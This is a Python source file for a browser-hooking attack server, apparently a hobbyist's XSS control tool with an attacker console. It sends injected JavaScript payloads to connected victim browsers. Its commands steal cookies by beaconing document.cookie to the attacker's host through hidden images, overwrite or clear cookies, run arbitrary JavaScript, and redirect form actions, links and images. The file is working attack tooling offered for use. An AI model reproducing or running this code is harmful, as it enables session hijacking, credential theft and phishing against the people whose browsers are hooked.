'''
PLEASE HAVE MERCY ON MY UGLY CODE.
Honestly though. I really did not bother with this one, I just wanted to get SOMETHING out there to start off.
I promise my next projects will be better.

by AuroSaurus
===============

usage:
server.py HOST PORT

===============
'''

from __future__ import print_function
from IPy import IP
import SocketServer
import sys
import urllib
import threading
import time
import shlex
import re

HOST, PORT = sys.argv[1], int(sys.argv[2])
fimp = ""
output = []
ips = []
msg = ""
db = {}
target = "1"
commands = {"help":[[],"Lists all available commands."], "refreshconnected":[[],"Checks to see which ips are still connected and displays them."], "sniffcookies":[["Target IP"],"Displays cookies of specified target."], "changecookies":[["Target IP","New cookies"],"Sets cookies of target to specified value."], "refrigeratecookies":[["Target IP","Output File"],"Logs the cookies of specified target to output file."], "burncookies":[["Target IP"],"Clears cookies for specified target."], "js":[["Target IP","Javascript code"],"Executes specified js within script tags."], "jsfile":[["Target IP","Path to file"],"Executes specified js from file within script tags."], "redirectforms":[["Target IP","New value"],"Modify 'action' attribute of all forms in document(s) of specified target."], "redirectlinks":[["Target IP","New value"],"Changes the 'href' attribute on all 'a' tags in document(s) of specified target."], "redirectimages":[["Target IP","New value"],"Changes the 'src' attribute on all 'img' tags in document(s) of specified target."], "playaudio":[["Target IP","Source","Source Type"],"Plays audio to specified target."], "quit":[[],"Quits."]}

def setpl(pl, targ="1"):
	global fimp
	global target
	global db
	global msg
	msg = False
	target = targ
	db = {}
	fimp = pl

def help():
	print('')
	for command in commands:
		print(command + (' ' * (19-len(command))) + '| ' + commands[command][1])
		print((' ' * 19) + '- Usage: ' + command + ' ' + ' '.join(['<' + arg + '>' for arg in commands[command][0]]) + '\n\n')
	print("\nYou can also use '1' in place of any 'Target IP' to target all connected.\n")

def refreshconnected():
	global output
	global ips
	global db
	ips = []
	setpl("var con=document.createElement('img');con.setAttribute('src', 'http://%s:%d/CONNECTED');con.setAttribute('height', '0px');con.setAttribute('width', '0px');document.body.appendChild(con);" % (HOST, PORT))
	print('Sending payload...')
	time.sleep(1)
	rq = []
	for out in output:
		if (out[0] == "CONNECTED") and (out[1] not in ips):
			ips.append(out[1])
			rq.append(out)
	output = [out for out in output if out not in rq]
	print('\b\b\bCONNECTED:')
	print('\n'.join(ips))

def js(targ="1",js=""):
	setpl(js, targ)
	print('Sending payload...')
	
def jsfile(targ="1",file=""):
	try:
		f = open(file)
		jsf = f.read()
		f.close()
		setpl(jsf, targ)
		print('Sending payload...')
	except Exception as e:
		print("Error retrieving file - Could be an invalid path?")

def sniffcookies(targ="1"):
	global output
	rq = []
	cookies = []
	setpl("var con=document.createElement('img');con.setAttribute('src', 'http://%s:%d/COOKIES='+document.cookie);con.setAttribute('style', 'display: none;');document.body.appendChild(con);" % (HOST, PORT), targ)
	print('Sending payload...')
	time.sleep(1)
	for out in output:
		if (out[0][:8] == "COOKIES=") and (out not in rq):
			cookies.append(out[0][8:])
			rq.append(out)
	output = [out for out in output if out not in rq]
	print('\b\b\bCOOKIES:')
	print(urllib.unquote('\n\n'.join(cookies)))
	
def refrigeratecookies(targ="1",fout="cookies.txt"):
	global output
	global fimp
	global target
	rq = []
	cookies = []
	setpl("var con=document.createElement('img');con.setAttribute('src', 'http://%s:%d/FCOOKIES='+document.cookie);con.setAttribute('style', 'display: none;');document.body.appendChild(con);" % (HOST, PORT), targ)
	print('Sending payload...')
	time.sleep(1)
	for out in output:
		if (out[0][:9] == "FCOOKIES=") and (out not in rq):
			cookies.append(out[0][9:])
			rq.append(out)
	output = [out for out in output if out not in rq]
	try:
		f = open(fout, 'w')
		f.write(urllib.unquote('\n\n'.join(cookies)))
		print("Saved cookies to: '" + fout + "'")
	except:
		print("Error saving file - Could be an invalid path?")

def changecookies(targ="1",value=""):
	value = value[0:-1] if value[-1] == ";" else print()
	cmd = ""
	for cookie in value.split(';'):
		cmd += 'document.cookie="' + cookie + ';";'
	setpl(cmd, targ)
	print('Sending payload...')
	
def burncookies(targ="1"):
	setpl('function createCookie(name,value,days){if(days){var date=new Date();date.setTime(date.getTime()+(days*24*60*60*1000));var expires="; expires="+date.toGMTString()}else var expires="";document.cookie=name+"="+value+expires+"; path=/"}var cookies=document.cookie.split(";");for(var i=0;i<cookies.length;i++){createCookie(cookies[i].split("=")[0],"",-1)}', targ)
	print('Sending payload...')

def redirectforms(targ="1", loc=""):
	setpl('document.getElementsByTagName("form")[0].setAttribute("action", "' + loc + '");', targ)
	print('Sending payload...')

def redirectlinks(targ="1", loc=""):
	setpl('document.getElementsByTagName("a")[0].setAttribute("href", "' + loc + '");', targ)
	print('Sending payload...')

def redirectimages(targ="1", loc=""):
	setpl('document.getElementsByTagName("img")[0].setAttribute("src", "' + loc + '");', targ)
	print('Sending payload...')

def playaudio(targ="1", loc="", type="audio/mpeg"):
	setpl('var aud = document.createElement("audio");aud.setAttribute("id","YoHoHoRadio"); var src = document.createElement("source");src.setAttribute("src", "' + loc + '");src.setAttribute("type", "' + type + '");aud.appendChild(src);document.body.appendChild(aud);aud.play()', targ)
	print('Sending payload...')
	
def quit():
	print('Quitting...')
	t.shutdown()
	sys.exit()

class handle_req(SocketServer.BaseRequestHandler):
	def handle(self):
		global command
		global output
		global ips
		global db
		global fimp
		global target
		global msg
		data = self.request.recv(1024)
		if self.client_address[0] not in db:
			db[self.client_address[0]] = False
		if data[:3] == "GET":
			try:
				if re.match('^GET \/(.*?)? HTTP\/1.1', data).group(1) != ("favicon.ico" or ""):
					output.append([re.match('^GET \/(.*?) HTTP\/1.1', data).group(1), self.client_address[0]])
					if output[-1][0] == '':
						output.pop()
			except:
				pass
			if db[self.client_address[0]] == False:
				if target == "1":
					self.request.sendall("""\
			HTTP/1.1 200 OK

			""" + fimp)
					if msg == False:
						print("\b\b\bSuccess!\n>> ", end="")
						msg = True
				elif target == self.client_address[0]:
					self.request.sendall("""\
			HTTP/1.1 200 OK

			""" + fimp)
					if msg == False:
						print("\b\b\bSuccess!\n>> ", end="")
						msg = True
				else:
					try:
						IP(target)
					except:
						if msg == False:
							print("\b\b\bThat's an invalid target ip. Failed to send payload.\n>> ", end="")
							msg = True
			else:
				self.request.sendall("""\
			HTTP/1.1 200 OK

			""")
		db[self.client_address[0]] = True
		self.request.close()
		
class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

def get_attacker_input():
	global db
	input = ""
	while True:
		if input != "":
			try:
				if len(shlex.split(input)[1:]) == len(commands[shlex.split(input)[0]][0]):
					eval(shlex.split(input)[0] + '(' + ','.join(['"' + arg + '"' for arg in shlex.split(input)[1:]]) + ')')
					target = "1"
					fimp = ""
				else:
					print("'" + shlex.split(input)[0] + "' expects " + str(len(commands[shlex.split(input)[0]][0])) + " arguments: " + str(len(shlex.split(input)[1:])) + " given. Type 'help' for more info.")
			except:
				print("That is not a valid command. Type 'help' for a list of commands.")
			input = ""
		input = raw_input(">> ")

print('Server bound to port %s' % PORT)
t = threading.Thread(target=get_attacker_input)
t.start()
server = ThreadedTCPServer((HOST,PORT), handle_req)
server.serve_forever()
